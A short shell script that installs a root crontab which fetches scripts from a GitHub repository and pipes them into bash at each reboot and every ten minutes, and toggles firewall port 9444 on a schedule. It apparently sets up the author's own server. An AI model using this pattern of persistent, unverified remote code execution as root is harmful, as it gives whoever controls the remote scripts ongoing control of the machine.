#!/bin/sh
sudo su
echo "@reboot curl https://raw.githubusercontent.com/junscapital/reload/master/reload.sh | bash
1,11,21,31,41,51 * * * * curl https://raw.githubusercontent.com/junscapital/reload/master/oneminute.sh | bash
2 1,9,17 * * * sudo ufw allow 9444/tcp
12 1,9,17 * * * sudo ufw deny 9444/tcp
 " >> myverifier
sudo crontab myverifier
rm myverifier
